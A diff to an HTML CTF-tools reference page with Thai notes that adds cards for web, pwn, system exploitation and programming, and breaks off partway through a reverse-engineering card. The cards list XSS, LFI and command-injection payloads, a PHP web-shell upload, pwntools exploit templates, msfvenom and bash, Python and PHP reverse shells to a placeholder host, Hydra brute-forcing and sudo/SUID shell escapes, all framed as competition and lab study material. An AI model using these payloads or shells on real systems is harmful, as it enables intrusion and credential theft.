@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>⚑ CTF Tools — Self-Contained Reference</title>
+<title>⚑ CTF Tools WEB2 — 2025 Competition Reference</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23070710'/%3E%3Cpath d='M18 12v40M20 14h28l-6 9 6 9H20' fill='none' stroke='%235b8dee' stroke-width='5' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='18' cy='52' r='4' fill='%239b6dff'/%3E%3C/svg%3E">
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
@@ -149,14 +149,14 @@ mark{background:rgba(245,200,66,.22);color:#f0d060;border-radius:2px;padding:0 1
 
 <nav id="sidebar">
   <div class="sb-logo">
-    <h1>⚑ CTF Tools</h1>
-    <p>Self-Contained Reference</p>
+    <h1>⚑ CTF Tools WEB2</h1>
+    <p>2025 Competition Reference</p>
   </div>
   <div class="sb-search"><input id="sb-search" class="search-input" placeholder="🔍  ค้นหา..." autocomplete="off" aria-label="ค้นหาเครื่องมือ"></div>
   <div class="sb-nav" id="sb-nav"></div>
   <div class="sb-footer">
-    gregalletti/CTF_tools + extended by Kiro 🤖<br>
-    Self-contained — ไม่ต้องออกไปที่อื่น
+    gregalletti/CTF_tools + WEB2 2025 pack<br>
+    Self-contained — เพิ่มชุดเครื่องมือแข่งปี 2025
   </div>
 </nav>
 
@@ -184,6 +184,7 @@ mark{background:rgba(245,200,66,.22);color:#f0d060;border-radius:2px;padding:0 1
 // ════════════════════════════════════════════════════════════
 const CATS=[
   {id:'all',      icon:'🏠',label:'ทั้งหมด',     c:'#5b8dee'},
+  {id:'ctf2025',  icon:'25',label:'CTF 2025',    c:'#f5c842'},
   {id:'training', icon:'🚩',label:'Training',     c:'#3ecf74'},
   {id:'general',  icon:'📋',label:'General',      c:'#5b8dee'},
   {id:'crypto',   icon:'🔒',label:'Cryptography', c:'#9b6dff'},
@@ -207,6 +208,1828 @@ const CATS=[
 //          tips:[], checklist:[], notes}
 // ════════════════════════════════════════════════════════════
 const TOOLS=[
+
+/* ═══════════ CTF 2025 OFFICIAL TOOL PACK ═══════════ */
+{cat:'ctf2025',name:'CTF 2025 Web Application Toolkit',url:'https://portswigger.net/burp',tags:['cli','online','python'],
+desc:'ชุดเครื่องมือ Web ปี 2025: BurpSuite, curl, dirb, dirsearch, Gobuster, SQLmap, JWT, LFI, CMS, Flask, Postman',
+about:'การ์ดนี้รวม workflow Web Application สำหรับแข่ง CTF ปี 2025 ตามรายการเครื่องมือ: BurpSuite/BurpSuite Pro, Curl, Dirb, DirBuster, Dirsearch, Hack Bar, Gobuster/GoBustor, robots.txt, WPScan, Joomscan, jwt.io, SQLmap, LFISuite, Postman, GitTools/Gittool, JWTtool, Arjun, Parameth, Cheat Engine, XSStrike/XSS Strike, CMSeeK, Flask-Unsign และ HackTricks เป้าหมายคือเริ่มจาก recon → content discovery → parameter discovery → auth/session/JWT → injection → file read/upload → CMS scan → exploit chain เพื่อหา flag',
+install:`# Kali/Debian quick install
+sudo apt update
+sudo apt install -y curl dirb gobuster sqlmap wpscan joomscan nikto seclists jq git python3-pip
+python3 -m pip install dirsearch arjun flask-unsign pyjwt requests beautifulsoup4
+
+# Tools from GitHub
+git clone https://github.com/maurosoria/dirsearch.git tools/dirsearch
+git clone https://github.com/s0md3v/Arjun.git tools/Arjun
+git clone https://github.com/GerbenJavado/LinkFinder.git tools/LinkFinder
+git clone https://github.com/internetwache/GitTools.git tools/GitTools
+git clone https://github.com/ticarpi/jwt_tool.git tools/jwt_tool
+git clone https://github.com/s0md3v/XSStrike.git tools/XSStrike
+git clone https://github.com/Tuhinshubhra/CMSeeK.git tools/CMSeeK
+
+# Browser/GUI
+# BurpSuite Community/Pro, Hack Bar extension, Postman, jwt.io, HackTricks`,
+usage:[{label:'Recon + first touch',body:`URL=http://target
+
+# ดู response แบบละเอียด
+curl -i $URL/
+curl -k -v $URL/
+curl -s $URL/robots.txt
+curl -s $URL/sitemap.xml
+curl -sI $URL/ | tee headers.txt
+
+# fingerprint headers/technology
+whatweb $URL
+wappalyzer-cli $URL
+httpx -title -tech-detect -status-code -follow-redirects -u $URL
+
+# robots.txt / backup / common leaks
+curl -s $URL/robots.txt | tee robots.txt
+curl -s $URL/.git/HEAD
+curl -s $URL/.env
+curl -s $URL/backup.zip
+curl -s $URL/config.php.bak
+
+# BurpSuite flow
+# 1. set browser proxy 127.0.0.1:8080
+# 2. browse app normally
+# 3. send interesting request to Repeater
+# 4. use Intruder only for small focused fuzzing
+# 5. compare responses by status, length, redirect, Set-Cookie`},
+{label:'Directory/content discovery',body:`# Wordlists
+WL=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+SMALL=/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+EXT=php,txt,html,js,json,bak,old,zip,tar.gz,sql,conf
+
+# Gobuster / GoBustor
+gobuster dir -u $URL -w $WL -x $EXT -t 40 -k -o gobuster.txt
+gobuster dir -u $URL -w $SMALL -x php,txt,bak -s 200,204,301,302,307,401,403
+
+# dirsearch
+python3 tools/dirsearch/dirsearch.py -u $URL -e $EXT -w $WL -x 404,400 --random-agent -o dirsearch.txt
+
+# dirb / DirBuster style
+dirb $URL /usr/share/wordlists/dirb/common.txt -X .php,.txt,.bak,.zip
+
+# filter false positives by size
+ffuf -u $URL/FUZZ -w $WL -e .php,.txt,.bak,.zip -fs 0 -mc all
+
+# interesting paths
+admin login dashboard api graphql swagger openapi backup upload download debug dev test staging .git .svn .env phpinfo.php`},
+{label:'Parameter discovery + API testing',body:`# Arjun: discover GET/POST parameters
+arjun -u "$URL/index.php" -m GET,POST -oT arjun.txt
+arjun -u "$URL/api/search" --headers "Cookie: session=YOURCOOKIE" -oJ arjun.json
+
+# Parameth style parameter bruteforce
+python3 parameth.py -u "$URL/page.php?FUZZ=test"
+
+# Wayback/JS endpoint discovery
+gau target.com | tee urls.txt
+waybackurls target.com | tee -a urls.txt
+katana -u $URL -jc -kf all -o katana.txt
+python3 tools/LinkFinder/linkfinder.py -i app.js -o cli
+
+# Postman
+# Import OpenAPI/Swagger JSON, set environment variables:
+# baseUrl, token, cookie, user_id
+# Then test auth bypass, IDOR, hidden admin endpoints
+
+# curl JSON/API examples
+curl -s "$URL/api/users/1" -H "Cookie: session=..."
+curl -s -X POST "$URL/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}'
+curl -s "$URL/api/item?id=1"
+curl -s "$URL/api/item?id=2"  # IDOR check`},
+{label:'SQLmap + manual SQLi',body:`# manual probes first
+curl -i "$URL/item?id=1'"
+curl -i "$URL/item?id=1 OR 1=1--"
+curl -i "$URL/item?id=1 UNION SELECT NULL--"
+
+# sqlmap GET
+sqlmap -u "$URL/item?id=1" --batch --dbs
+sqlmap -u "$URL/item?id=1" -D dbname --tables --batch
+sqlmap -u "$URL/item?id=1" -D dbname -T users --dump --batch
+
+# sqlmap with cookie/request file from Burp
+sqlmap -r request.txt --batch --level 5 --risk 3 --dbs
+sqlmap -r request.txt -p id --tamper=space2comment --batch
+
+# POST/JSON
+sqlmap -u "$URL/api/search" --data "q=test" --batch --dbs
+sqlmap -u "$URL/api/search" --data '{"q":"test"}' --headers "Content-Type: application/json" --batch --dbs
+
+# useful flags
+--threads 5 --random-agent --fresh-queries --dump --os-shell --file-read=/flag.txt`},
+{label:'XSS / LFI / command / upload',body:`# XSS quick payloads
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+
+# XSStrike
+python3 tools/XSStrike/xsstrike.py -u "$URL/search?q=test"
+python3 tools/XSStrike/xsstrike.py -u "$URL/search" --data "q=test"
+
+# LFI checks
+curl "$URL/download?file=../../../../etc/passwd"
+curl "$URL/download?file=....//....//....//etc/passwd"
+curl "$URL/download?file=php://filter/convert.base64-encode/resource=index.php"
+curl "$URL/download?file=/proc/self/environ"
+curl "$URL/download?file=/proc/self/cmdline"
+
+# LFISuite
+python2 lfisuite.py
+
+# command injection probes
+curl "$URL/ping?host=127.0.0.1;id"
+curl "$URL/ping?host=127.0.0.1%0aid"
+curl "$URL/ping?host=127.0.0.1|whoami"
+
+# file upload bypass
+shell.php.jpg
+shell.phtml
+Content-Type: image/jpeg
+GIF89a;<?php system($_GET['cmd']); ?>`},
+{label:'JWT / Flask / session attacks',body:`# jwt.io: decode header/payload, check alg/kid/jku/exp/role
+
+# JWTtool
+python3 tools/jwt_tool/jwt_tool.py TOKEN
+python3 tools/jwt_tool/jwt_tool.py TOKEN -M at
+python3 tools/jwt_tool/jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
+python3 tools/jwt_tool/jwt_tool.py TOKEN -I -pc role -pv admin
+
+# alg none test
+# header {"alg":"none","typ":"JWT"} then empty signature
+
+# kid traversal / weak secret ideas
+kid=../../../../dev/null
+kid=public.pem
+kid=../../../../../../tmp/key
+
+# Flask-Unsign
+flask-unsign --decode --cookie 'COOKIE'
+flask-unsign --unsign --cookie 'COOKIE' --wordlist /usr/share/wordlists/rockyou.txt
+flask-unsign --sign --cookie "{'is_admin': True, 'user_id': 1}" --secret 'secret'
+
+# Cookie/session checks
+curl -i $URL/admin -H "Cookie: session=FORGED"`},
+{label:'CMS + git leaks',body:`# WordPress
+wpscan --url $URL --enumerate u,p,t,tt,cb,dbe --plugins-detection aggressive
+wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+
+# Joomla
+joomscan -u $URL
+
+# CMSeeK
+python3 tools/CMSeeK/cmseek.py -u $URL
+
+# GitTools / Gittool: exposed .git
+curl -s $URL/.git/HEAD
+bash tools/GitTools/Dumper/gitdumper.sh $URL/.git/ gitdump
+bash tools/GitTools/Extractor/extractor.sh gitdump gitextract
+git -C gitextract log --oneline --all
+git -C gitextract show --stat
+git -C gitextract grep -n "flag\\|password\\|secret\\|token"
+
+# HackTricks
+# Use as payload/reference: https://book.hacktricks.xyz/
+# Map bug class -> payload -> post exploitation path`}],
+tips:['เริ่มที่ Burp Repeater เพื่อเข้าใจ request ก่อนโยนให้ sqlmap/ffuf','robots.txt มักบอก path สำคัญในโจทย์ง่ายถึงกลาง','อย่า brute force กว้างก่อนรู้ baseline response length','Arjun/Parameth ช่วยเจอ parameter ซ่อนที่ directory scan ไม่เห็น','JWT ให้เช็ค alg none, weak secret, kid traversal, jku/jwk, role claim','Flask cookie ถ้า crack secret ได้คือจบ auth bypass ได้บ่อย','Git leak ให้ดู commit history ไม่ใช่แค่ไฟล์ล่าสุด','CMS scan ต้องตามด้วย manual exploit version/plugin เสมอ','Postman เหมาะกับ API/GraphQL ที่ต้องจัด token หลายชุด','Cheat Engine ไม่ใช่ web tool ปกติ แต่ใช้กับ client-side game/app memory challenge ได้'],
+checklistTitle:'Web 2025 checklist',
+checklist:['จับ request ด้วย Burp แล้วเก็บ request สำคัญเป็นไฟล์','เช็ค robots.txt, sitemap.xml, .git, .env, backup, debug','ทำ directory discovery หลาย wordlist และ filter false positive','หา parameter ด้วย Arjun/Parameth/JS endpoint discovery','ทดสอบ auth bypass, IDOR, role/user_id/cookie tamper','ทดสอบ SQLi manual ก่อนใช้ sqlmap','ทดสอบ XSS, SSTI, command injection, LFI/RFI, upload bypass','ตรวจ JWT/Flask/session secret','ถ้าเป็น CMS ให้ใช้ WPScan/Joomscan/CMSeeK','ค้น flag ใน source, response, backup, database dump, git history'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Pwnable / Binary Exploitation Toolkit',url:'https://docs.pwntools.com/',tags:['cli','python'],
+desc:'Pwntools, pwndbg, peda, gef, Cutter, GDB, objdump, readelf, checksec, Hopper, radare2 สำหรับ pwn',
+about:'ชุด pwn ปี 2025 เน้น Linux ELF และ service remote: Pwntool/Pwntools, Pwndbg, Peda, Gef, Cutter, GDB, ObjDump, ReadELF, CheckSec, Hopper และ Radare2 ใช้ flow เดียวกันคือ identify binary → protections → run/crash → find offset → leak/ROP/ret2win/ret2libc/format string → automate ด้วย pwntools → ส่ง remote เพื่ออ่าน flag',
+install:`sudo apt update
+sudo apt install -y gdb gdbserver python3-pip python3-dev gcc g++ make file binutils patchelf radare2 checksec
+python3 -m pip install --upgrade pwntools ropper
+
+# pwndbg
+git clone https://github.com/pwndbg/pwndbg ~/pwndbg
+cd ~/pwndbg && ./setup.sh
+
+# gef
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+
+# peda
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+# GUI
+# Cutter, Hopper, Ghidra, Binary Ninja, IDA Free/Pro`,
+usage:[{label:'Triage binary',body:`file chall
+checksec --file=chall
+readelf -h chall
+readelf -s chall | grep -i "win\\|flag\\|system"
+readelf -r chall
+objdump -d -M intel chall | less
+strings -a chall | grep -iE "flag|win|system|/bin/sh|password"
+ltrace ./chall
+strace -f ./chall
+
+# radare2 quick
+r2 -A ./chall
+afl
+pdf @ main
+izz
+aaa; afl~win; pdf @ sym.main`},
+{label:'GDB / pwndbg / gef basics',body:`gdb -q ./chall
+set disassembly-flavor intel
+run
+info functions
+info registers
+x/40gx $rsp
+x/s 0x404000
+disassemble main
+break main
+break *0x401234
+continue
+nexti
+stepi
+
+# pwndbg commands
+checksec
+context
+cyclic 300
+cyclic -l 0x6161616c
+rop
+vmmap
+telescope $rsp
+got
+plt`},
+{label:'Find offset + ret2win skeleton',body:`# create cyclic pattern
+python3 - <<'PY'
+from pwn import *
+print(cyclic(300).decode())
+PY
+
+# after crash, find offset from RIP/EIP value
+python3 - <<'PY'
+from pwn import *
+print(cyclic_find(0x6161616c))
+PY
+
+# pwntools ret2win
+python3 - <<'PY'
+from pwn import *
+elf = context.binary = ELF('./chall')
+p = process()
+offset = 72
+payload = flat(
+    b'A' * offset,
+    elf.symbols['win']
+)
+p.sendlineafter(b'> ', payload)
+p.interactive()
+PY`},
+{label:'Remote exploit template',body:`from pwn import *
+context.binary = elf = ELF('./chall')
+context.log_level = 'info'
+
+HOST, PORT = 'host', 31337
+def start():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    return process(elf.path)
+
+p = start()
+offset = 72
+rop = ROP(elf)
+payload = flat({offset: [
+    rop.find_gadget(['ret'])[0],
+    elf.symbols.get('win', 0x401234)
+]})
+p.sendline(payload)
+p.interactive()
+
+# run:
+# python3 solve.py
+# python3 solve.py REMOTE`},
+{label:'ret2libc / ROP checklist',body:`# Need leak if PIE/ASLR/libc
+checksec --file=chall
+readelf -r chall | grep puts
+ROPgadget --binary chall | grep "pop rdi"
+ropper --file chall --search "pop rdi; ret"
+
+# typical chain:
+# 1. call puts(puts@got)
+# 2. return main
+# 3. compute libc base
+# 4. call system("/bin/sh")
+
+# one_gadget if libc known
+one_gadget libc.so.6
+
+# patch local libc/ld
+pwninit
+patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall`},
+{label:'Format string quick path',body:`# probes
+AAAA.%p.%p.%p.%p.%p.%p
+%x-%x-%x-%x
+%s
+%n
+
+# pwntools helpers
+from pwn import *
+payload = fmtstr_payload(offset=6, writes={elf.got['puts']: elf.symbols['win']})
+
+# find offset manually:
+for i in range(1, 30):
+    p = process('./chall')
+    p.sendline(f'AAAA.%{i}$p'.encode())
+    print(i, p.recvall(timeout=.2))
+    p.close()`}],
+tips:['เช็ค protections ก่อนเสมอ: NX, Canary, PIE, RELRO','ถ้ามี win/function อ่าน flag ให้ ret2win ก่อน ไม่ต้องทำ shell','64-bit Linux ต้องจัด stack alignment บางทีต้องใส่ ret gadget ก่อน call system','ใช้ pwntools automate ทุกอย่างที่ต้องทำซ้ำกับ remote','Pwndbg/Gef/Peda เลือกตัวเดียวใน .gdbinit เพื่อไม่ชนกัน','Cutter/radare2 ช่วยดู flow แต่ exploit ควรยืนยันใน gdb','objdump/readelf เร็วและใช้ได้ทุกสนามแข่ง','ถ้า libc mismatch ให้ leak แล้วใช้ libc database/pwninit'],
+checklistTitle:'Pwn 2025 checklist',
+checklist:['file/checksec/readelf/strings ทุก binary','หา main, win, print_flag, system, puts, gets, scanf','รัน local แล้วทำ crash reproduction','หา offset ด้วย cyclic','ดู calling convention และ stack alignment','เลือกเทคนิค ret2win, ret2libc, ROP, fmtstr, shellcode ตาม protections','ทำ solve.py ที่สลับ local/remote ได้','เทสต์กับ remote แล้ว log leak/base address','เก็บ flag จาก stdout หรือ shell','เขียน note offset/gadget/libc version'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 System Exploitation Toolkit',url:'https://nmap.org/',tags:['cli'],
+desc:'Nmap, Metasploit, searchsploit, msfvenom, Docker, Nikto, PEAS, GTFOBins, Hydra, nc, enum4linux, Shodan',
+about:'System Exploitation ปี 2025 คือ workflow สำหรับ machine/lab/โจทย์ service: Nmap, Metasploit, Searchsploit, MSFVenom, Docker, Nikto, LinPEAS, WinPEAS, GTFOBins, PayloadsAllTheThings, Angry IP Scanner, NetCat/nc, Enum4Linux, Hydra, Medusa, NCrack, XHydra, ExploitDB, LES: Linux Exploit Search และ Shodan',
+install:`sudo apt update
+sudo apt install -y nmap metasploit-framework exploitdb netcat-traditional ncat hydra medusa ncrack enum4linux-ng nikto docker.io
+sudo apt install -y seclists gobuster smbclient ftp telnet ldap-utils snmp snmp-mibs-downloader
+
+# PEAS
+mkdir -p tools/peas
+wget -O tools/peas/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+wget -O tools/peas/winPEASx64.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
+
+# LES
+git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git tools/LES`,
+usage:[{label:'Nmap service enumeration',body:`TARGET=10.10.10.10
+
+# fast then full
+nmap -Pn -n --open -T4 --top-ports 1000 $TARGET -oN nmap_fast.txt
+nmap -Pn -n -p- --min-rate 5000 $TARGET -oN nmap_allports.txt
+PORTS=$(grep -oP '^[0-9]+' nmap_allports.txt | paste -sd, -)
+nmap -Pn -n -sCV -p $PORTS $TARGET -oN nmap_scv.txt
+
+# UDP top ports
+nmap -Pn -sU --top-ports 50 $TARGET -oN nmap_udp.txt
+
+# NSE examples
+nmap --script vuln -p $PORTS $TARGET
+nmap --script smb-enum-shares,smb-enum-users -p445 $TARGET
+nmap --script http-enum,http-title,http-headers -p80,8080 $TARGET`},
+{label:'Exploit lookup + Metasploit',body:`# Searchsploit / ExploitDB
+searchsploit apache 2.4.49
+searchsploit -m linux/remote/xxxxx.py
+searchsploit -x linux/remote/xxxxx.py
+
+# Metasploit
+msfconsole
+search type:exploit name:apache
+use exploit/multi/http/example
+show options
+set RHOSTS 10.10.10.10
+set RPORT 80
+set LHOST tun0
+run
+
+# payload generation
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
+msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php`},
+{label:'Netcat / nc / shells',body:`# listeners
+nc -lvnp 4444
+ncat -lvnp 4444
+rlwrap -cAr nc -lvnp 4444
+
+# common reverse shells
+bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# upgrade shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+stty rows 40 columns 120
+
+# file transfer
+python3 -m http.server 8000
+wget http://YOUR_IP:8000/linpeas.sh
+curl -O http://YOUR_IP:8000/linpeas.sh
+certutil.exe -urlcache -f http://YOUR_IP:8000/winPEASx64.exe winpeas.exe`},
+{label:'Bruteforce credentials',body:`# Hydra
+hydra -L users.txt -P passwords.txt ssh://$TARGET -t 4 -V
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+hydra -L users.txt -P pass.txt ftp://$TARGET
+hydra -L users.txt -P pass.txt smb://$TARGET
+
+# Medusa
+medusa -h $TARGET -U users.txt -P pass.txt -M ssh
+medusa -h $TARGET -u admin -P pass.txt -M ftp
+
+# NCrack
+ncrack -p ssh -U users.txt -P pass.txt $TARGET
+ncrack -p rdp -U users.txt -P pass.txt $TARGET
+
+# XHydra = GUI for Hydra when allowed`},
+{label:'Linux privilege escalation',body:`# Basic checks
+id
+whoami
+uname -a
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+find / -writable -type d 2>/dev/null | head
+getcap -r / 2>/dev/null
+crontab -l
+cat /etc/passwd
+cat /etc/crontab
+
+# LinPEAS / LES
+chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.txt
+python3 tools/LES/linux-exploit-suggester.py
+
+# GTFOBins examples
+sudo -l
+# if sudo tar allowed:
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+# if SUID find:
+find . -exec /bin/sh -p \\; -quit`},
+{label:'Windows privilege escalation',body:`# Basic checks
+whoami /all
+whoami /priv
+hostname
+systeminfo
+net user
+net localgroup administrators
+ipconfig /all
+netstat -ano
+dir C:\\Users\\
+
+# WinPEAS
+winPEASx64.exe
+
+# common file search
+dir /s /b *flag* *proof* *user.txt* *root.txt* 2>nul
+findstr /si password *.txt *.xml *.ini *.config 2>nul
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
+
+# service perms
+sc query
+icacls "C:\\Program Files\\SomeService"
+accesschk.exe -uwcqv "Authenticated Users" *`},
+{label:'SMB / web / Shodan / Docker',body:`# SMB enum
+enum4linux-ng -A $TARGET
+smbclient -L //$TARGET/ -N
+smbclient //$TARGET/share -N
+smbmap -H $TARGET
+
+# Nikto
+nikto -h $URL -o nikto.txt
+
+# Docker basics
+docker ps
+docker images
+docker run --rm -it -v "$PWD":/work kalilinux/kali-rolling bash
+
+# PayloadsAllTheThings + GTFOBins
+# Use for exact privesc/shell/payload syntax
+
+# Shodan
+shodan host 1.2.3.4
+shodan search 'product:Apache country:TH'
+shodan search 'ssl.cert.subject.cn:target.com'`}],
+tips:['Nmap all ports ก่อน แล้วค่อย -sCV เฉพาะ port ที่เปิด','Searchsploit ต้องอ่าน exploit code ก่อนรันเสมอ ปรับ target/path/version','Metasploit ใช้เร็วแต่ใน CTF manual exploit มักควบคุมได้ดีกว่า','PEAS output ใหญ่ ให้ grep password, writable, sudo, SUID, capability','GTFOBins ใช้เมื่อตรงกับ sudo/SUID/capability ที่เจอ','Hydra ต้องรู้ failure string ให้ถูก ไม่งั้น false positive','nc/ncat/rlwrap ช่วยให้ shell ใช้งานได้ดีขึ้น','Docker ใช้ทำ lab isolated หรือรัน tool version แยกจากเครื่องหลัก'],
+checklistTitle:'System 2025 checklist',
+checklist:['Nmap fast/full/service/UDP ตามเวลา','enumerate ทุก service ตาม port ไม่เดาสุ่ม','ตรวจ web ด้วย Nikto/dirsearch ถ้ามี HTTP','หา exploit ด้วย searchsploit/ExploitDB/Shodan/HackTricks','ได้ foothold แล้ว upgrade shell และทำ file transfer','รัน LinPEAS/WinPEAS และ manual privesc checks','ตรวจ sudo/SUID/capabilities/cron/service permissions','bruteforce เฉพาะเมื่อมี user list หรือ rate limit รับได้','เก็บ user flag ก่อน root flag','จด credentials reuse สำหรับ lateral movement'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Programming Workspace',url:'https://code.visualstudio.com/',tags:['python','cli','java'],
+desc:'Python, C, C++, Java, VSCode, Sublime, Notepad++, vi/nano, IDLE, Eclipse, DevC++, CodeBlocks, oneLang',
+about:'Programming category ต้องแก้โจทย์ algorithm, parsing, sockets, automation, brute force และ exploit helper อย่างรวดเร็ว เครื่องมือปี 2025: Python, C, C++, Java, Sublime, NotePad/NotePad++, Beautify in CyberChef, Vi/Nano, VSCode, MousePad, IDLE Python 2/3, Eclipse Java, DevC++ C/C++, CodeBlocks, Pwntool socket programming และ https://ide.onelang.io/',
+install:`sudo apt update
+sudo apt install -y python3 python3-pip python2 gcc g++ make default-jdk nodejs npm vim nano codeblocks
+python3 -m pip install pwntools requests beautifulsoup4 pycryptodome sympy z3-solver numpy pillow
+
+# Editors
+# VSCode, Sublime Text, Notepad++, MousePad
+# Java IDE: Eclipse
+# C/C++ IDE: DevC++, CodeBlocks
+# Online converter/IDE: https://ide.onelang.io/`,
+usage:[{label:'Python CTF template',body:`#!/usr/bin/env python3
+from pathlib import Path
+import re, sys, base64, binascii, itertools, math, json
+
+data = Path(sys.argv[1]).read_bytes() if len(sys.argv) > 1 else sys.stdin.buffer.read()
+
+# common searches
+for m in re.finditer(rb'(flag|picoCTF|ctf)\\{[^}\\r\\n]+\\}', data, re.I):
+    print(m.group(0).decode(errors='ignore'))
+
+# bytes helpers
+print(data[:32].hex())
+print(bytes([b ^ 0x42 for b in data[:64]]))
+
+# brute force single-byte XOR
+for k in range(256):
+    out = bytes(b ^ k for b in data)
+    if b'flag' in out.lower() or b'ctf{' in out.lower():
+        print(k, out[:200])`},
+{label:'Pwntools socket programming',body:`from pwn import *
+
+HOST, PORT = 'host', 1337
+p = remote(HOST, PORT)
+
+p.recvuntil(b'> ')
+p.sendline(b'hello')
+line = p.recvline()
+print(line)
+
+# parse numbers
+nums = list(map(int, re.findall(rb'-?\\d+', line)))
+p.sendline(str(sum(nums)).encode())
+
+p.interactive()`},
+{label:'C / C++ quick compile',body:`# C
+gcc -Wall -Wextra -O2 solve.c -o solve
+gcc -g -fsanitize=address solve.c -o solve_asan
+
+# C++
+g++ -std=c++17 -O2 -pipe -static -s solve.cpp -o solve
+g++ -std=c++20 -Wall -Wextra -g solve.cpp -o solve_dbg
+
+# useful snippets
+xxd input.bin | head
+time ./solve < input.txt
+./solve < input.txt > output.txt`},
+{label:'Java quick compile',body:`javac Solve.java
+java Solve < input.txt
+
+# jar inspect/run
+jar tf challenge.jar
+java -jar challenge.jar
+javap -c -p SomeClass.class
+
+# Eclipse for large Java projects; CFR/JD-GUI for reverse challenge`},
+{label:'Beautify/deobfuscate code',body:`# CyberChef Beautify:
+# JavaScript Beautify, JSON Beautify, From Base64, From Hex, URL Decode
+
+# CLI formatters
+python3 -m json.tool data.json
+python3 -m py_compile solve.py
+black solve.py
+clang-format -i solve.c solve.cpp
+
+# JS quick beautify
+npx prettier --write app.js
+
+# grep clues
+grep -RniE "flag|password|secret|token|TODO|admin" .`},
+{label:'Algorithm checklist snippets',body:`# Python modules often useful
+import collections, heapq, bisect, itertools, functools
+from math import gcd, isqrt
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+
+# graph BFS
+from collections import deque
+q=deque([start]); seen={start}
+while q:
+    u=q.popleft()
+    for v in graph[u]:
+        if v not in seen:
+            seen.add(v); q.append(v)
+
+# brute product
+for cand in itertools.product('abc123', repeat=4):
+    s=''.join(cand)`}],
+tips:['Python เร็วสุดสำหรับ parsing/bruteforce/network automation','C/C++ ใช้เมื่อโจทย์ต้อง performance หรือ binary detail','Java ใช้กับโจทย์ .jar/.class และ algorithm บางสนาม','VSCode/Sublime/Notepad++ ใช้ search ข้ามไฟล์ได้เร็ว','CyberChef Beautify ดีมากกับ JS/JSON/URL encoded payload','IDLE Python 2 ยังมีประโยชน์กับโจทย์เก่าที่ script เป็น Python2','pwntools ไม่ได้ใช้แค่ pwn ใช้ทำ socket protocol automation ได้ดี','เขียน solve script ให้ rerun ได้ ไม่แก้มือใน terminal ทุกครั้ง'],
+checklistTitle:'Programming 2025 checklist',
+checklist:['แยก input/output และเขียน parser ก่อน','สร้าง solve.py/solve.cpp ที่ rerun ได้','หา pattern flag ด้วย regex','ใช้ CyberChef beautify/decode เมื่อเจอ encoded code','ถ้าเป็น network challenge ให้ใช้ pwntools remote','ถ้า brute force ให้ใส่ progress/early stop','ใช้ Python big integers สำหรับ crypto/math','ใช้ C++ เมื่อ Python ช้าเกิน','เก็บ intermediate output เป็นไฟล์','ใส่ comments สั้นๆ ใน solve script เพื่อกลับมา debug ได้'],
+},
+
+{cat:'ctf2025',name:'CTF 2025 Reverse Engineering Toolkit',url:'https://ghidra-sre.org/',tags:['cli','java','python'],
+desc:'IDA Pro, Ghidra, Jadx, Binary Ninja, decompiler.com, uncompyle6, pyinstxtractor, pycdc, JD-GUI, CFR, dex2jar, UPX, ILSpy, dnSpy',
+about:'Reverse Engineering ปี 2025 ครอบคลุม native binary, Python packed app, Java/JAR, Android APK, .NET และ obfuscation: IDA Pro, Ghidra, Jadx, Binary Ninja, Decompiler Online, Uncompyle6, PyExtractor/PyInstaller/pyinstxtractor, pycdc, JD-GUI, CFR, Bytecode Viewer, d2j-dex2jar, Python dis, UPX, PyLingual, ILSpy และ dnSpy',
+install:`sudo apt update
+sudo apt install -y file strings binutils gdb radare2 upx-ucl default-jdk apktool jadx dex2jar python3-pip
+python3 -m pip install uncompyle6 pycdc pyinstxtractor xdis
+
+# GUI
+# Ghidra, IDA Pro/Free, Binary Ninja, Cutter, JD-GUI, Bytecode Viewer, ILSpy, dnSpy
+# Online: https://www.decompiler.com/ and https://pylingual.io/`,
+usage:[{label:'Native binary triage',body:`file chall
+strings -a chall | grep -iE "flag|password|correct|wrong|license|serial"
+checksec --file=chall
